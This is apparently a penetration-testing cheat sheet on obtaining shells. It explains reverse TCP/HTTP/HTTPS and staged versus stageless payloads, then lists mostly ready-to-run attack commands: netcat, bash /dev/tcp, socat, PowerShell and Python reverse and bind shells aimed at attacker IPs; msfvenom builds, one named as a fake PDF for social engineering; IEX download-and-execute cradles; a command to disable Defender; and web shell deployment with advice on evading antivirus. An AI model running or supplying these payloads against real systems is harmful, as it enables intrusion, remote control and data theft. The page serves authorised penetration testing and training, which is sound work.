# Shells

{% embed url="https://security.packt.com/reverse-shells-from-payloads/" %}

**1. Reverse TCP**: Reverse TCP shells provide interactive and stable connections when the payload connects back to our attacker machine. However, this comes at a cost. It is often less stealthy as connecting to a nonstandard port like 6666 or 4444 can trigger alarms on IDS/IPS and other network monitoring solutions. Also, a raw TCP connection going to port 80/443 can also seem suspicious. Therefore, we have more sophisticated payloads as a workaround.

**2. Reverse HTTP**: Reverse HTTP payloads use the HTTP protocol instead of TCP and therefore can seem like legitimate traffic on network monitoring tools. However, HTTP payloads are slow in response and can cause lag. Also, HTTP is plaintext, therefore the traffic can be sniffed and monitored.

**3. Reverse HTTPS**: Reverse HTTPS payload upgrades the HTTP connection to a secure HTTPS connection with encryption so that all communication is encrypted and cannot be monitored on the network. Therefore, an HTTPS connection to port 443 would look like a legitimate network connection on IDS/IPS systems.

### Staged vs. Stageless Payloads

`Staged` payloads create a way for us to send over more components of our attack. We can think of it like we are "setting the stage" for something even more useful. Take for example this payload `linux/x86/shell/reverse_tcp`. When run using an exploit module in Metasploit, this payload will send a small `stage` that will be executed on the target and then call back to the `attack box` to download the remainder of the payload over the network, then executes the shellcode to establish a reverse shell. Of course, if we use Metasploit to run this payload, we will need to configure options to point to the proper IPs and port so the listener will successfully catch the shell. Keep in mind that a stage also takes up space in memory which leaves less space for the payload. What happens at each stage could vary depending on the payload.

`Stageless` payloads do not have a stage. Take for example this payload `linux/zarch/meterpreter_reverse_tcp`. Using an exploit module in Metasploit, this payload will be sent in its entirety across a network connection without a stage. This could benefit us in environments where we do not have access to much bandwidth and latency can interfere. Staged payloads could lead to unstable shell sessions in these environments, so it would be best to select a stageless payload. In addition to this, stageless payloads can sometimes be better for evasion purposes due to less traffic passing over the network to execute the payload, especially if we deliver it by employing social engineering. This concept is also very well explained by Rapid 7 in this blog post on [stageless Meterpreter payloads](https://www.rapid7.com/blog/post/2015/03/25/stageless-meterpreter-payloads/).

### Bind Shell

With a bind shell, the `target` system has a listener started and awaits a connection from a pentester's system (attack box).

#### NetCat

```shell
# Target
nc -lvnp 7777
# Kali
nc -nv 10.129.41.200 7777
```

#### Bash

```bash
# Target
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
# Kali
nc -nv 10.129.41.200 7777
```

### Reverse Shell

With a `reverse shell`, the attack box will have a listener running, and the target will need to initiate the connection.

#### Netcat

```bash
nc -e /bin/sh 10.0.0.1 4242
nc -e /bin/bash 10.0.0.1 4242
nc -c bash 10.0.0.1 4242
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f
rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f
```

#### Impacket-Smbserver

```bash
# On Kali
impacket-smbserver share .
# On Windows
\\192.168.119.193\share\nc.exe -e cmd.exe 192.168.119.193 443
```

#### Bash

```shell
# TCP
bash -c 'bash -i >& /dev/tcp/10.10.10.10/443 0>&1'
bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
0<&196;exec 196<>/dev/tcp/10.0.0.1/4242; sh <&196 >&196 2>&196
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f
/bin/bash -l > /dev/tcp/10.0.0.1/4242 0<&1 2>&1

# UDP
nc -u -lvp 4242 #Listener
sh -i >& /dev/udp/10.0.0.1/4242 0>&1
```

#### Socat

```bash
socat -d -d TCP4-LISTEN:443 STDOUT # listener
socat TCP4:10.11.0.22:443 EXEC:/bin/bash # reverse shell
```

#### Powershell

```shell
# Kali
sudo nc -lvnp 443
# target
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.15.7',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# Disable AV if needed
Set-MpPreference -DisableRealtimeMonitoring $true

#Nishang
powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.29/shell.ps1')

powershell IEX (IWR http://10.10.10.10/revshell.ps1 -UseBasicParsing)
```

#### MSFVenom

```shell
msfvenom -l payloads

# Stageless
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.119.120 LPORT=443 -f exe -o /var/www/html/msfnonstaged.exe
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe

# Staged
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 -f exe -o /var/www/html/msfstaged.exe
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.137 LPORT=443 -f exe -o shell.exe
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.6 LPORT=443 -f psh -o meterpreter-64.ps1
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.119.120 LPORT=443 -f aspx > reverse.aspx
msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f raw> reverse.jsp
msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f war > reverse.war

msfvenom -p php/meterpreter_reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f raw > shell.php; cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php

sudo msfconsole -q
use multi/handler
set payload windows/x64/meterpreter/reverse_https
set EXITFUNC thread
```

#### Python

```python
# TCP
python -c "import os,pty,socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('LHOST',LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv('HISTFILE','/dev/null');pty.spawn(['/bin/bash','-i']);s.close();exit();"
```

#### MSSQL xp\_cmdshell

```powershell
xp_cmdshell \\192.168.49.136\share\nc.exe -e cmd.exe 192.168.49.136 80
```

### Spawning a TTY Shell with Python

```shell
python -c 'import pty; pty.spawn("/bin/sh")' 
python3 -c 'import pty; pty.spawn("/bin/sh")'
python -c 'import pty; pty.spawn("/bin/bash")' 
python3 -c 'import pty; pty.spawn("/bin/bash")'

/bin/sh -i
/bin/bash -i

perl —e 'exec "/bin/sh";'
perl: exec "/bin/sh"; # should be run from a script
ruby: exec "/bin/sh" # should be run from a script
lua: os.execute('/bin/sh') # should be run from a script
awk 'BEGIN {system("/bin/sh")}'
find . -exec /bin/sh \; -quit
vim -c ':!/bin/sh'

# Vim escape
vim
:set shell=/bin/sh
:shell
```

### Webshell

#### Laudanum

Laudanum is a repository of ready-made files that can be used to inject onto a victim and receive back access via a reverse shell, run commands on the victim host right from the browser, and more. The repo includes injectable files for many different web application languages to include `asp, aspx, jsp, php,` and more. Laudanum is built into Parrot OS and Kali by default. For any other distro, you will likely need to pull a copy down to use. You can get it [here](https://github.com/jbarcia/Web-Shells/tree/master/laudanum).

The Laudanum files can be found in the `/usr/share/webshells/laudanum` directory

```bash
cp /usr/share/webshells/laudanum/aspx/shell.aspx .
```

#### Antak

Antak is a web shell built-in ASP.Net included within the [Nishang project](https://github.com/samratashok/nishang). Nishang is an Offensive PowerShell toolset that can provide options for any portion of your pentest. Since we are focused on web applications for the moment, let's keep our eyes on `Antak`. Antak utilizes PowerShell to interact with the host, making it great for acquiring a web shell on a Windows server. The UI is even themed like PowerShell.

The Antak files can be found in the `/usr/share/nishang/Antak-WebShell` directory.

Antak web shell functions like a Powershell Console. However, it will execute each command as a new process. It can also execute scripts in memory and encode commands you send. As a web shell, Antak is a pretty powerful tool.

```bash
cp /usr/share/nishang/Antak-WebShell/antak.aspx .
```

Make sure you set credentials for access to the web shell. Modify `line 14`, adding a user and password. This comes into play when you browse to your web shell, much like Laudanum. This can help make your operations more secure by ensuring random people can't just stumble into using the shell. It can be prudent to remove the ASCII art and comments from the file. These items in a payload are often signatured on and can alert the defenders/AV to what you are doing.

#### WhiteWinterWolf's PHP Web Shell

{% embed url="https://github.com/WhiteWinterWolf/wwwolf-php-webshell" %}

### Tools, Tactics, and Procedures for Payload Generation, Transfer, and Execution

#### Payload Generation

We have plenty of good options for dealing with generating payloads to use against Windows hosts.&#x20;

| **Resource**                      | **Description**                                                                                                                                                                                                                                                                                                   |
| --------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `MSFVenom & Metasploit-Framework` | [Source](https://github.com/rapid7/metasploit-framework) MSF is an extremely versatile tool for any pentester's toolkit. It serves as a way to enumerate hosts, generate payloads, utilize public and custom exploits, and perform post-exploitation actions once on the host. Think of it as a swiss-army knife. |
| `Payloads All The Things`         | [Source](https://github.com/swisskyrepo/PayloadsAllTheThings) Here, you can find many different resources and cheat sheets for payload generation and general methodology.                                                                                                                                        |
| `Mythic C2 Framework`             | [Source](https://github.com/its-a-feature/Mythic) The Mythic C2 framework is an alternative option to Metasploit as a Command and Control Framework and toolbox for unique payload generation.                                                                                                                    |
| `Nishang`                         | [Source](https://github.com/samratashok/nishang) Nishang is a framework collection of Offensive PowerShell implants and scripts. It includes many utilities that can be useful to any pentester.                                                                                                                  |
| `Darkarmour`                      | [Source](https://github.com/bats3c/darkarmour) Darkarmour is a tool to generate and utilize obfuscated binaries for use against Windows hosts.                                                                                                                                                                    |

#### Payload Transfer and Execution:

Besides the vectors of web-drive-by, phishing emails, or dead drops, Windows hosts can provide us with several other avenues of payload delivery. The list below includes some helpful tools and protocols for use while attempting to drop a payload on a target.

* `Impacket`: [Impacket](https://github.com/SecureAuthCorp/impacket) is a toolset built-in Python that provides us a way to interact with network protocols directly. Some of the most exciting tools we care about in Impacket deal with `psexec`, `smbclient`, `wmi`, Kerberos, and the ability to stand up an SMB server.
* [Payloads All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Download%20and%20Execute.md): is a great resource to find quick oneliners to help transfer files across hosts expediently.
* `SMB`: SMB can provide an easy to exploit route to transfer files between hosts. This can be especially useful when the victim hosts are domain joined and utilize shares to host data. We, as attackers, can use these SMB file shares along with C$ and admin$ to host and transfer our payloads and even exfiltrate data over the links.
* `Remote execution via MSF`: Built into many of the exploit modules in Metasploit is a function that will build, stage, and execute the payloads automatically.
* `Other Protocols`: When looking at a host, protocols such as FTP, TFTP, HTTP/S, and more can provide you with a way to upload files to the host. Enumerate and pay attention to the functions that are open and available for use.

### TTY Shells

**Bash**

```bash
/bin/bash -i
echo os.system('/bin/bash')
/bin/sh -i
```

#### Python

```python
python -c "import pty; pty.spawn('/bin/bash')"
```

#### Perl

```perl
perl -e 'exec "/bin/bash";'
```

#### rlwrap

```bash
sudo apt install rlwrap
rlwrap -cAr nc -nvlp [PORT]
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

#### Interactive TTY

```bash
# In reverse shell
python -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z

# In Kali
# for bash
stty raw -echo
fg

# for zsh
stty raw -echo; fg

# In reverse shell
reset
export SHELL=bash
export TERM=xterm-256color
#  stty size
stty rows <num> columns <cols>
```
